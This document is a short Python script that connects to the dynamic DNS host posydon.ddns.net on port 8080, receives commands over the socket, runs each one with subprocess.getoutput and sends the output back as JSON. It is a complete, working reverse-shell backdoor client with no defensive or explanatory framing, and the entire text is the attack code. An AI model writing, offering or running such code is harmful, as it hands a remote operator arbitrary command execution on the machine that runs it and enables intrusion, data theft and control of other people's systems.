import socket
import subprocess
import json  # Import the json module for encoding data

SERVER = "posydon.ddns.net"
PORT = 8080

s = socket.socket()
s.connect((SERVER, PORT))

try:
    while True:
        command = s.recv(1024).decode()
        if not command:
            break
        print(command)
        result = subprocess.getoutput(command)
        print(result)
        data_to_send = {'type': 'response', 'data': result}
        # Encode the dictionary as a JSON string before sending
        s.send(json.dumps(data_to_send).encode())

except KeyboardInterrupt:
    s.send("Connection closed by the user".encode())

finally:
    s.close()
